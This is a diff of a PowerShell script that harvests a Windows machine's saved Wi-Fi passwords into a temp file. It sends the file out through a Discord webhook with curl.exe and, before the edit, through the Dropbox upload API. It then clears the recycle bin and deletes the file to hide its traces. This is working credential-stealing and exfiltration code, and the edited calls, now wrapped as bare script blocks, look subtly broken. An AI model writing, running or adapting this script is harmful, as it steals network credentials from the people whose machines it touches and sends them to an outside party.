@@ -7,29 +7,7 @@ $wifiProfiles > $env:TEMP/--wifi-pass.txt
 
 ############################################################################################################################################################
 
-# Upload output file to Dropbox
 
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
 
 ############################################################################################################################################################
 
@@ -56,7 +34,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+{Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
 
  
 
@@ -80,7 +58,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 ############################################################################################################################################################
 
-if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+{Clean-Exfil}
 
 
 RI $env:TEMP/--wifi-pass.txt
